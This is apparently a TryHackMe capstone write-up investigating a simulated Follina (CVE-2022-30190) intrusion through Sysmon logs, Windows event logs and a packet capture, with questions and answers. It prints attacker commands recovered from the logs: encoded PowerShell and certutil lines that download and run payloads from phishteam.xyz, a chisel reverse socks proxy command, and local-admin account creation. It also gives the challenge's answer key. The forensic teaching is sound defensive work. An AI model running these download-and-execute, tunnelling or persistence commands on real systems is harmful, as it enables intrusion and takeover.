#tryhackme #cybersecurity #capstonechallenge
# Preparation - Log Analysis

Before we proceed, let's have a quick refresher regarding these topics, which may help build a methodology for analyzing captured events:

- Log Analysis
- Event Correlation
## Log Analysis

Log Analysis is the process of understanding events generated by a computer to idenitify anomalies such as application bugs, system performance, or other risks that may impact the organization.

A log file is an audit trial of events or activities within the application and systems of an organization. Logs automatically audit any activity configured, such as system messages, authentication attempts, and network traffic is generated. In addition, every log entry is audited with a timestamp of when the event occurred, which deeply aids in an investigation.
## Event Correlation

Even correlation identifies significant relationships from multiple log sources, such as application logs, endpoint logs, and network logs.

Event correlation deals with identifying significant artefacts co-existing from different log sources and connecting each related artifact. For example, a network connection log may exist in various log sources, such as Sysmon logs (Event ID 3: Network Connection) and Firewall logs. Firewall logs may provide the source and destination IP, source and destination port, protocol, and the action taken. In contrast, Sysmon logs may give the process that invoked the network connection and the user running the process.

With this information, we can connect the dots of each artefact from the two data sources:

- Source and Destination IP
- Source and Destination Port
- Action Taken
- Protocol
- Process name
- User Account
- Machine Name

Event correlation can build the puzzle pieces to complete the exact scenario from an investigation.
# Preparation - Tools and Artifacts

In this task, we will prepare the artifacts and introduce the tools needed for the investigation. 
## Compare by Hash

Before conducting the investigation, one of the most important steps is to compare the artefacts by their hashes. It is a common practice to verify if the artefacts are expected as it is.

You can get the hashes of each artefact by running Powershell from the taskbar and executing the following commands:

```Powershell
PS C:\Users\user> cd '.\Desktop\Incident Files\'
```

```Powershell
PS C:\Users\user\Desktop\Incident Files> ls


    Directory: C:\Users\user\Desktop\Incident Files


Mode                LastWriteTime         Length Name
––––                –––––––––––––         –––––– ––––
–a––––        6/21/2022   1:46 AM       17479060 capture.pcapng
–a––––        6/21/2022   1:30 AM        3215360 sysmon.evtx
–a––––        6/21/2022   1:29 AM        1118208 windows.evtx
```

```Powershell
PS C:\Users\user\Desktop\Incident Files> Get-FileHash -Algorithm SHA256 .\capture.pcapng

Algorithm       Hash                                                                   Path
–––––––––       ––––                                                                   ––––
SHA256          CB3A1E6ACFB246F256FBFEFDB6F494941AA30A5A7C3F5258C3E63CFA27A23DC6       C:\Users\user\...
```
## Toolset

The toolset needed for this task is focused on analyzing Sysmon Logs, Windows Event Logs, and Packet Capture.
### Endpoint Logs

To analyze Windows artefacts such as Windows Event Logs and Sysmon logs, we will use the following tools:

- EvtxEcmd
- Timeline Explorer
- SysmonView
- Event Viewer
### Network Logs

To analyze the provided packet capture, we will use the following tools:

- Wireshark
- Brim

Note: You can access the tools listed above via the taskbar.

Since only some of the tools listed above such as Wireshark, Brim, Event Viewer are already covered by the prerequisite rooms, we will only cover the new ones in this section.
### EvtxEcmd & Timeline Explorer

**Eric Zimmerman** has created a set of forensic tools used to analyze Windows artefacts called [EZTools (Eric Zimmerman's Tools)](https://ericzimmerman.github.io/#!index.md). For this task, we will focus on **EvtxEcmd** and **Timeline Explorer**, as these tools are mainly used for parsing and analyzing Evtx logs. 

EvtxEcmd is a command-line tool which pareses Windows Event Logs into different formats such as CSV, JSON, XML, etc. You may use this tool in conjunction with Timeline Explorer, created by the same author. Timeline Explorer is a GUI-based tool that functions as a data filtering and navigating application to ease incident responders in handling raw data.

To parse the provided logs, we need first to convert the EVTX logs into CSV using EvtcEcmd and then feed it into Timeline Explorer.

```Powershell
PS C:\Tools\EvtxECmd> .\EvtxECmd.exe -f 'C:\Users\user\Desktop\Incident Files\sysmon.evtx' --csv 'C:\Users\user\Desktop\Incident Files' --csvf sysmon.csv
EvtxECmd version 1.0.0.0

Author: Eric Zimmerman (saericzimmerman@gmail.com)
https://github.com/EricZimmerman/evtx

Command line: -f C:\Users\user\Desktop\Incident Files\sysmon.evtx --csv C:\Users\user\Desktop\Incident Files --csvf sysmon.csv

Warning: Administrator privileges not found!

CSV output will be saved to C:\Users\user\Desktop\Incident Files\sysmon.csv

Maps loaded: 383

Processing C:\Users\user\Desktop\Incident Files\sysmon.evtx...
Chunk count: 42, Iterating records...

Event log details
Flags: None
Chunk count: 42
Stored/Calculated CRC: EAFDE57A/EAFDE57A
Earliest timestamp: 1601-01-01 00:00:00.0000000
Latest timestamp:   2022-06-20 17:30:35.3630890
Total event log records found: 2,559

Records included: 2,559 Errors: 0 Events dropped: 0

Metrics (including dropped events)
Event ID        Count
1               238
2               2
3               92
5               3
8               3
11              1,024
12              186
13              869
15              6
22              136

Processed 1 file in 19.8850 seconds
```

For TimelineExplorer.exe, we can load the exported CSV file by doing the following: `File -> Open -> Choose sysmon.csv from C:\Users\user\Desktop\Incident Files directory`.

Once the logs are loaded, you may navigate through each column and use the input field to filter specific logs via a unique string. 

![](https://i.imgur.com/ioClgzi.png)

Lastly, you may use the search feature in the upper right-hand corner to find a unique string that may exist on any column. 
### SysmonView

SysmonView is a Windows GUI-based tool that visualizes Sysmon logs. Before we use this tool, we must export the log file's contents into XML via **Event Viewer.**

![](https://i.imgur.com/OJvET7F.png)

The machine will notify you once the file has been successfully exported. 

Usage: 

- Go to `File > Import Sysmon Event Logs` then choose the XML files generated using the Event Viewer.
- Once loaded, the left sidebar has search functionality that can filter a specific process in mind.
- Choose the image path and session GUID to render the mapped view.

![](https://i.imgur.com/za3jyYa.png)
# Initial Access - Malicious Document

## Tempest Incident

In this incident, you will act as an Incident Responder from an alert triggered by one of your Security Operations Center analysts. The analyst has confirmed that the alert has a **CRITICAL** severity that needs further investigation.

As reported by the SOC analyst, the instrusion started from a malicious document. In addition, the analyst compiled the essential information generated by the alert as listed below:

- The malicious document was a `.doc` extension.
- The user downloaded the malicious document via `chrome.exe`
- The malicious document then executed a chain of commands to attain code execution.
## Investigation Guide

To aid with the investigation, you may refer to the cheatsheet crafted by the team applicable to this scenario:

- Start with the events generated by Sysmon
- EvtxEcmd, Timeline Explorer, and SysmonView can interpret Sysmon logs.
- Follow the child processes of WinWord.exe
- Use filters such as ParentProcessID or ProcessID to correlate the relationship of each process.
- We can focus on Sysmon events such as Process Creation (Event ID 1) and DNS queries (Event ID 22) to correlate the activity generated by the malicious document.

Significant Data Sources: Sysmon

### Question 1

> The user of this machine was compromised by a malicious document. What is the file name of the document?

We know that chrome.exe is going to be the process of interest. (in this case, the image), and a file was downloaded, so let's filter to Sysmon Event 11 (File Create).

Note: This has a lot of columns and rows, you will need to scroll to the right to find some of the interesting stuff!

![](https://i.imgur.com/G3FDPTD.png)

This narrows down the search quite quickly. We have found our doc of interest:

**Answer**: `free_magicules.doc`
### Question 2

> What is the name of the compromised user and machine?

**Answer**: `benimaru-tempest`

This can be found by scrolling further to the right.

![](https://i.imgur.com/u5RhEfq.png)
### Question 3

> What is the PID of the Microsoft Word process that opened the malicious document?

So, let's unset our filters, but set some on information we now know (or can assume.)

- User `benimaru` is our victim
- Our event of interest is process creation (Event ID 1)
- The user downloaded a `.doc` file, which is opened (usually) with `winword.exe`

Filtering the user, Executable Info and Event ID we are left with really 1 event of substance (as the other has no metadata).

![](https://i.imgur.com/hBKCVyk.png)

Scrolling a little to the left, we find our PID:

![](https://i.imgur.com/JYAJdUR.png)
### Question 4

> Based on Sysmon logs, what is the IPv4 address resolved by the malicious domain used in the previous question?

What we know:

- Sysmon Event ID 22 - DNS Query
- PID is 496

Let's filter on the above, and we find our answer:

![](https://i.imgur.com/JW9DbGv.png)

**Answer**: `167[.]71[.]199[.]191`
### Question 5

Once again, what do we know?

- This question is referring to something invoked by the document, so we can assume the Parent PID of the malicious payload is 496.
- EventID is Process Creation.

**Note**: The ParentProcessID field can be found in the Payload Data 4 row.

![](https://i.imgur.com/Msq1nZK.png)

![](https://i.imgur.com/mk0FB58.png)

**Answer**:

```
**“**_JGFwcD1bRW52aXJvbm1lbnRdOjpHZXRGb2xkZXJQYXRoKCdBcHBsaWNhdGlvbkRhdGEnKTtjZCAiJGFwcFxNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXAiOyBpd3IgaHR0cDovL3BoaXNodGVhbS54eXovMDJkY2YwNy91cGRhdGUuemlwIC1vdXRmaWxlIHVwZGF0ZS56aXA7IEV4cGFuZC1BcmNoaXZlIC5cdXBkYXRlLnppcCAtRGVzdGluYXRpb25QYXRoIC47IHJtIHVwZGF0ZS56aXA7Cg==”_
```

Let's extract the base64 and decode it using CyberChef.

![](https://i.imgur.com/YxfrCar.png)
### Question 6

> What is the CVE number of the exploit used by the attacker to achieve a remote code execution?

Doing some googling around the LOLBins used, you may see a familiar name, Follina.

**Answer**: `2022-30190`
# Initial Access - Stage 2 Execution
## Malicious Document - Stage 2

Based on the initial findings, we discovered that there is a stage 2 execution:

- The document has successfully executed an encoded base64 execution:
- Decoding this string reveals the exact command chain executed by the malicious document.
## Investigation Guide

With the following discoveries, we may refer again to the cheatsheet to continue with the investigation:

- The Autostart execution reflects explorer.exe as its parent process ID.
- Child processes of explorer.exe within the event timeframe could be significant.
- Process Creation (Event ID1) and File Creation (Event ID 11) succeeding the document execution are worth checking.

Significant Data Sources: 

- Sysmon
### Question 1

> The malicious execution of the payload wrote a file on the system. What is the full path of the payload?

Let's filter down to file create (Event 11) and where the TargetFilename (PayloadData4) contains the Startup Directory.

**Answer**: `C:\Users\benimaru\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\update.zip`
### Question 2

> The implanted payload executes once the user logs into the machine. What is the executed command upon a successful login of the compromised user?

So far we know the following:

- The Autostart execution reflects explorer.exe as its parent process.
- The target user, as per the path is benimaru

Filtering on these (parent process = explorer, user = benimaru and EventID = 1) we are left with the following:

![](https://i.imgur.com/fapoD4T.png)

**Answer**:

```powershell
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -noni certutil -urlcache -split -f ‘[http[://]phishteam[.]xyz/02dcf07/first.exe'](http://phishteam.xyz/02dcf07/first.exe') C:\Users\Public\Downloads\first.exe; C:\Users\Public\Downloads\first.exe
```
### Question 3

> Based on the Sysmon logs, what is the SHA256 hash of the malicious binary downloaded for stage 2 execution?

I believe only EventID 1 records the files hash, so let's look at the execution to answer this question. (Executable Info (Child Process) of first.exe we are interested in right now, not the Parent Process. If you recall, in the certutil command run, the binary was also executed).

**Answer**: CE278CA242AA2023A4FE04067B0A32FBD3CA1599746C160949868FFC7FC3D7D8
### Question 4

> The stage 2 payload downloaded establishes a connection to a C2 server. What is the domain and port used by the attacker?

They have just downloaded their stage 2 and then executed it, so let's take a look at what it's doing by setting our ParentProcess to the first.exe

![](https://i.imgur.com/wmnJ6kf.png)

We see some recon/discovery, which we may return to shortly, followed by an outbound connection established using `ch.exe`.

Additionally, looking at DNS requests made by the process, we see:
# Initial Access - Malicious Document Traffic

Based on the collected findings, we discovered that the attacker fetched the stage 2 payload remotely:

- We discovered the DOmain and IP invoked by the malicious document on Sysmon logs. 
- There is another domain and IP used by the stage 2 payload logged from the same data source.
## Investigation Guide

Since we have discovered network-related artefacts, we may again refer to our cheatsheet, which focused on Network Log Analysis:

- We can now use `Brim and Wireshark` to investigate the packet capture.
- Find network events related to the harvested domains and IP addresses.
- Sample Brim filter that you can use for this investigation = `_path=="http" "<Malicious Domain>"`
### Data Sources

- Packet Capture
### Question 1

> What is the URL of the malicious payload embedded in the document?

Based on the collected findings, we discovered that the attacker fetched the stage 2 payload remotely:

- We discovered the Domain and IP invoked by the malicious document on Sysmon logs. 
- There is another domain and IP used by the stage 2 payload logged from the same data source.

Just as an initial note, let's just have a look at all the files downloaded to the system. 

![](https://i.imgur.com/9XEm9PQ.png)

Around the same time first.exe is downloaded, so is `ch.exe`, and shortly after `spf.exe`.

We will be using Wireshark for this.

```
http.host == "phishteam.xyz" && http.request.method == "GET"
```

![](https://i.imgur.com/VbyTnV5.png)

**Answer**: `http://phisteam.xyz/02dcf07/index.html`
### Question 2

> What is the encoding used by the attacker used on the C2 connection?

Based on prior questions again, we know the secondary domain already, we can reuse the `http.host` section

![](https://i.imgur.com/62B9UFL.png)

We can determine the data of interest if after the `q=` param and it appears to be Base64. Copying some of this and putting it into CyberChef we find the commands, which we also saw in the Sysmon events.

**Answer**: Base64
### Question 3

> The malicious C2 binary sends a payload using a parameter that contains the executed command results. What is the parameter used by the binary?

**Answer**: q

**Note:** This can be seen in the PCAP screenshot above.
### Question 4

> The malicious C2 binary connects to a specific URL to get the command to be executed. What is the URL used by the binary?

**Answer**: /9ab62b5 (This can be seen in the PCAP above as well)
### Question 5

> What is the HTTP method used by the binary?

**Answer**: `GET`
(This can also be found in the PCAP above)
### Question 6

> Based on the user agent, what programming language was used by the attacker to compile the binary?

Looking at the packet details, we see our programming language!

**Answer**: Nim

This can be found in Wireshark, by looking at the `Hypertext Transfer Protocol` data seen earlier in the above screenshots. 
# Discovery - Internal Reconnaissance
## Internal Reconnaissance

Based on the collected findings, we have discovered that the malicious binary continuously used the C2 traffic:

- We can easily decode the encoded string in the network traffic.
- The traffic contains the command and output executed by the attacker.
## Investigation Guide

To continue with the investigation, we may focus on the following information:

- Find network and process events connecting to the malicious domain.
- Find network events that contain an encoded command.
- We can use Brim to filter all packets containing the encoded string.
- Look for endpoint enumeration commands since the attacker is already inside the machine.

In addition we may refer to our cheatsheet for Brim to quickly investigate the encoded traffic with the following filters:

- To get all HTTP requests related to the malicious C2 traffic: `_path=="http" "<replace domain>" id.resp_p==<replace port> | cut ts, host, id.resp_p, url | sort ts`
### Significant Data Sources

- Packet Capture
- Sysmon
### Question 1

> The attacker was able to discover a sensitive file inside the machine of the user. What is the password discovered on the aforementioned site?

Going through the base64 encoded commands, we find the following:

![](https://i.imgur.com/Oorlp51.png)

**Answer**: infernotempest.

Combine all of the base64 encoded commands into one query on CyberChef, and it will reveal the full command. 
### Question 2

> The attacker then enumerated the list of listening ports inside the machine. What is the listening port that could provide a remote shell inside the machine?

Again decoding the base64 commands, we see netstat being executed:

![](https://i.imgur.com/68JN4dj.png)

Doing some googling, we see that Port 5985 is of interest to us.

"*Specifies the ports that the WinRM service uses for either HTTP or HTTPS. WinRM 2.0: The default HTTP port is 5985. The default HTTPS port is 5986.*"

In Wireshark, we also saw traffic like this:

![](https://i.imgur.com/cAu4ve8.png)

I pulled the Base64 traffic out using Brim, fed it into base64decode.org, stripped out the junk, and got this.

```
cat C:\Users\Benimaru\Desktop\automation.ps1 - $user = "TEMPEST\benimaru"  
$pass = "infernotempest"  
  
$securePassword = ConvertTo-SecureString $pass -AsPlainText -Force;  
$credential = New-Object System.Management.Automation.PSCredential $user, $securePassword
```

```
powershell iwr http://phishteam.xyz/02dcf07/ch.exe -outfile C:\Users\benimaru\Downloads\ch.exe
```

```
netstat -ano -p tcp -   
Active Connections  
  
  Proto  Local Address          Foreign Address        State           PID  
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       864  
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4  
  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING       5508  
  TCP    0.0.0.0:5357           0.0.0.0:0              LISTENING       4  
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4  
  TCP    0.0.0.0:7680           0.0.0.0:0              LISTENING       4964  
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4  
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       476  
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       1212  
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1760  
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       2424  
  TCP    0.0.0.0:49671          0.0.0.0:0              LISTENING       624  
  TCP    0.0.0.0:49676          0.0.0.0:0              LISTENING       608  
  TCP    192.168.254.107:139    0.0.0.0:0              LISTENING       4  
  TCP    192.168.254.107:51802  52.139.250.253:443     ESTABLISHED     3216  
  TCP    192.168.254.107:51839  34.104.35.123:80       TIME_WAIT       0  
  TCP    192.168.254.107:51858  104.101.22.128:80      TIME_WAIT       0  
  TCP    192.168.254.107:51860  20.205.146.149:443     TIME_WAIT       0  
  TCP    192.168.254.107:51861  204.79.197.200:443     ESTABLISHED     4352  
  TCP    192.168.254.107:51871  20.190.144.169:443     TIME_WAIT       0  
  TCP    192.168.254.107:51876  52.178.17.2:443        ESTABLISHED     4388  
  TCP    192.168.254.107:51878  20.60.178.36:443       ESTABLISHED     4388  
  TCP    192.168.254.107:51881  52.109.124.115:443     ESTABLISHED     4388  
  TCP    192.168.254.107:51882  52.139.154.55:443      ESTABLISHED     4388  
  TCP    192.168.254.107:51884  40.119.211.203:443     ESTABLISHED     4388  
  TCP    192.168.254.107:51895  52.152.90.172:443      ESTABLISHED     5508  
  TCP    192.168.254.107:51896  20.44.229.112:443      ESTABLISHED     8904
```

**Answer**: 5985
### Question 3

> The attacker then established a reverse socks proxy to access the internal services hosted inside the machine. What is the command executed by the attacker to establish the connection? **Remove the double quotes from the log**.

We found this a little earlier, but here's the screenshot again:

![](https://i.imgur.com/qmq5CUg.png)

Which was downloaded via:

![](https://i.imgur.com/3Eol2ex.png)

**Answer**: `C:\Users\benimaru\Downloads\ch.exe client 167.71.199.191:8080 R:socks`
### Question 4

> What is the SHA256 hash of the binary used by the attacker to establish the reverse socks proxy connection?

In the same log entry, just scrolling to the left a little, we find the hash.

**Answer:**`_8A99353662CCAE117D2BB22EFD8C43D7169060450BE413AF763E8AD7522D2451_`
### Question 5

> What is the name of the tool used by the attacker based on the SHA256 hash? Provide the answer in lowercase.

Search for the SHA256 hash from earlier on VirusTotal and go to the details page of the result to find the tool used.

**Answer**: `chisel`
### Question 6

> The attacker then used the harvested credentials from the machine. Based on the succeeding process after the execution of the socks proxy, what service did the attacker use to authenticate?

Just after the connection, we see `wsmprovhost.exe` spawning, indicating winrm. (As well as the comment regarding the port).

**Answer**: WinRM
# Privilege Escalation - Exploiting Privileges

Based on the collected findings, the attacker gained a stable shell through a reverse socks proxy. 
## Investigation Guide

With this, we can focus on the following network and endpoint events:

- Look for events executed after the successful execution of the reverse socks proxy tool.
- Look for potential privilege escalation attempts, as the attacker has already established a persistent low-privilege access.
### Significant Data Sources:

- Packet Capture
- Sysmon
### Question 1

> After discovering the privileges of the current user, the attacker then downloaded another binary to be used for privilege escalation. What is the name and the SHA256 hash of the binary?

As seen above, not long after the commands were issued, as well as the reverse socks proxy, we saw another binary being downloaded, spf.exe. Using very similar means as the previous answers, note now the parent process for these downloads and executions is `C:\Windows\System32\wsmprovhost.exe`.
### Question 2

> Based on the SHA256 hash of the binary, what is the name of the tool used?

![](https://i.imgur.com/PZt68EP.png)

**Answer**: `printspoofer`
### Question 3

> The tool exploits a specific privilege owned by the user. What is the name of the privilege?

We can quickly find this information online, especially from sources like Github.

**Answer**: `SeImpersonatePrivilege`
### Question 4

> Then, the attacker executed the tool with another binary to establish a C2 connection. What is the name of the binary?

In the same set of filters, just after the spf.exe download, we see the following:

- final.exe is downloaded from initial callback domain
- final.exe is executed through spf.exe

**Answer**: Final.exe
### Question 5

> The binary connects to a different port from the first C2 connection. What is the port used?

Note: As per the exploit, the attacker is now running as system, so be sure to remove the user filter.

Let’s first filter on both network and DNS events (Event ID 3 & 22) and set the Image to final.exe

![](https://i.imgur.com/iKR7tVx.png)

This gives us more than enough to find the port in Wireshark.

From our original query we also know the IP address.

![](https://i.imgur.com/n5iCQO1.png)

```
ip.dst == 167[.]71.222.162
```

Note: If you want to set anything to a column, simply right click and apply as column, I did it here for the port, wherein we see both port 80 (the first c2) and the second 8080.

**Answer**: 8080
# Actions on Objectives - Fully-Owned Machine

Now, the attacker has gained administrative privileges inside the machine. Final all persistence techniques used by the attacker. 

In addition, the unusual executions are related to the malicious C2 binary used during previous escalation.
## Investigation Guide

Now, we can rely on our cheatsheet to investigate events after a successful privilege escalation:

- Useful Brim filter to get all HTTP requests related to the malicious C2 traffic: `_path=="http" "<replace domain> id.resp<replace port> | cut ts, host, id.resp_p, uri | sort ts`
- The attacker gained SYSTEM privileges; now the user context for each malicious execution blends with **NT Authority\System**.
- All child events of the new malicious binary used for C2 are worth checking.
### Significant Data Sources

- Packet Capture
- Sysmon
- Windows Event Logs
### Question 1

> Upon achieving SYSTEM access, the attacker then created two users. What are the account names?

Now, the attacker has gained administrative privileges inside the machine. We need to know the users which he created so, using Timeline Explorer and searched for the binary `final.exe` with filtering for the Event ID for `process creation` and navigating to Executable Info. Scrolling down, we can see there are two users successfully created.

![](https://i.imgur.com/23ZApdS.png)

**Answer**: `shion,shuna`
### Question 2

> Prior to the successful creation of the accounts, the attacker executed commands that failed in the creation attempt. What is the missing option that made the attempt fail?

We can see from the previous screenshot that after the attacker creates the two users, he wants to add them in `localgroup` administrators and the syntax to add users to local group is:

![](https://i.imgur.com/zNYAexR.png)

**Answer**: `/add`

`localgroup “name of the group” /add “name of the user”` so he missed **/add.**
### Question 3

> Based on the Windows event logs, the accounts were successfully created. What is the event ID that indicates the account creation activity?

Use Google to answer this question. 

**Answer**: `4720`
### Question 4

> The attacker added one of the accounts in the local admin's group. What is the command used by the attacker?

We can see the command in the screenshot from the earlier question in this task:

**Answer**: `net localgroup administrators /add shion`
### Question 5

> Based on windows event logs, the account was successfully added to a sensitive group. What is the event ID that indicates the addition to a sensitive local group?

Using Google once again, we can find the answer.

**Answer**: 4732
### Question 6

> After the account creation, the attacker executed a technique to establish persistent administrative access. What is the command executed by the attacker to achieve this?

Looking for signs of *scheduled tasks*, or *service installation* around the time we come across `sc.exe` being used to create a new service, and setting the binpath to the `final.exe` binary. This was actually in between failed and successful account creation attempts, but regardless, we have found our answer.

![](https://i.imgur.com/xWCHani.png)

There is 2 here, however if we look a tad further, we only see Registry Events for TempestUpdate2:

![](https://i.imgur.com/zSdsOdI.png)

![](https://i.imgur.com/uWRZDpb.png)
